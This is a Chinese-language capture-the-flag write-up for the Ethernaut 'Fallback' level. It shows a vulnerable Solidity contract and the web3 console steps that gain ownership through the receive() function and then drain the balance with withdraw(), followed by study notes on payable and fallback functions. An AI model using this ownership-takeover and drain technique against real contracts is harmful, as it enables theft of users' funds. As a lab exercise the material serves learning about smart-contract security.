# 02_Fallback

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

针对上面的合约, 要将合约的owner改为player, 然后将合约余额完全转出到player账户

利用下面这个逻辑修改owner貌似不行,一直没法`contributions[msg.sender] > contributions[owner]`

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

利用下面这个

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

先调用 `contribute` 确保 `contributions[msg.sender]>0`

在发送一个纯转账到合约, 触发`receive()` (不是调用, 这个函数无法直接调用的), 然后便可以改变ower为player了

最后就可以调用 `withdraw()`将合约余额转出



##参考答案

```
^^.js:45 ♪└(￣◇￣)┐♪└(￣◇￣)┐♪└(￣◇￣)┐♪ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 19:46:13.264
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x63f429fcf50623eaa977cee39c6578097c88435c00120fca73e5feecdbef3c65
^^.js:35 => 实例地址0xA0E3d164252650439C8f45d211c41Ea33458c602
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 19:46:21.812
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x63f429fcf50623eaa977cee39c6578097c88435c00120fca73e5feecdbef3c65
redux-logger.js:1  action SET_BLOCK_NUM @ 19:46:26.804
contract
TruffleContract {methods: {…}, abi: Array(7), address: "0xA0E3d164252650439C8f45d211c41Ea33458c602", transactionHash: undefined, constructor: ƒ, …}
player
"0x9f1902a77cDE88DDA847adA7A7aAeB65bC2aC4af"
contract.address
"0xA0E3d164252650439C8f45d211c41Ea33458c602"
await contract.owner()
"0xDf9Df4e8B46b33ed21041a1040e50e04c586b3C6"
await contract.contribute({
	from:"0x9f1902a77cDE88DDA847adA7A7aAeB65bC2aC4af", 
	value:web3.utils.toWei('0.0005', 'ether')
})
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x3548137f9aaf0f0ae0e63bdc5b2d7a2fb19fc56e4a697e457aea4023890c022d
{tx: "0x3548137f9aaf0f0ae0e63bdc5b2d7a2fb19fc56e4a697e457aea4023890c022d", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x3548137f9aaf0f0ae0e63bdc5b2d7a2fb19fc56e4a697e457aea4023890c022d
redux-logger.js:1  action SET_BLOCK_NUM @ 19:47:36.615
await web3.eth.sendTransaction({
  from: "0x9f1902a77cDE88DDA847adA7A7aAeB65bC2aC4af",
  to: "0xA0E3d164252650439C8f45d211c41Ea33458c602",
  value: web3.utils.toWei('0.00001', 'ether'),
})
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x8b508977b7760001f5a298f465e14cc8b0b1f1301c9d5976dfab9ac8bd98459c
{transactionHash: "0x8b508977b7760001f5a298f465e14cc8b0b1f1301c9d5976dfab9ac8bd98459c", transactionIndex: 0, blockNumber: 65, blockHash: "0x0ee8f06a4d8a6860ce5125f0fdb91c14daa27306acd4ba20400c202da1e3c429", from: "0x9f1902a77cde88dda847ada7a7aaeb65bc2ac4af", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x8b508977b7760001f5a298f465e14cc8b0b1f1301c9d5976dfab9ac8bd98459c
redux-logger.js:1  action SET_BLOCK_NUM @ 19:48:36.615
await contract.owner()
"0x9f1902a77cDE88DDA847adA7A7aAeB65bC2aC4af"
await getBalance("0xA0E3d164252650439C8f45d211c41Ea33458c602")
"0.00051"
await contract.withdraw()
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xfb8556b5aaa10242916cb2d1dc3fdc9fdd55e8cdd0bc782e23a70c613e50e9c2
{tx: "0xfb8556b5aaa10242916cb2d1dc3fdc9fdd55e8cdd0bc782e23a70c613e50e9c2", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xfb8556b5aaa10242916cb2d1dc3fdc9fdd55e8cdd0bc782e23a70c613e50e9c2
redux-logger.js:1  action SET_BLOCK_NUM @ 19:49:56.612
await getBalance("0xA0E3d164252650439C8f45d211c41Ea33458c602")
"0"
^^.js:45 ◕_◕ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 19:50:10.776
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x31d03d873904ae900e66d3875be8176776ce28b16cf91b014220e053ad1ee0cd
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 19:50:18.252
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x31d03d873904ae900e66d3875be8176776ce28b16cf91b014220e053ad1ee0cd
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:73 龴ↀ◡ↀ龴 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 19:50:26.614

```



## 知识点

### payable函数

https://docs.soliditylang.org/en/v0.8.17/080-breaking-changes.html?highlight=payable#new-restrictions

### js调用payable函数

```js
await contract.contribute({
	from: myAddress, 
	value: xxx //单位是wei,
	gas: xxx //gas可以省略
})
```

### wei和ether转换

```js
web3.utils.toWei('0.0005', 'ether')
```

### 发送交易

```js
await web3.eth.sendTransaction({
  from: "0x9f1902a77cDE88DDA847adA7A7aAeB65bC2aC4af",
  to: "0xA0E3d164252650439C8f45d211c41Ea33458c602",
  value: web3.utils.toWei('0.00001', 'ether'),
})
```



### Fallback 函数

https://docs.soliditylang.org/en/v0.8.17/contracts.html#fallback-function

https://docs.soliditylang.org/en/v0.8.17/contracts.html#receive-ether-function

https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/fallback-function-and-receive-ether-function/
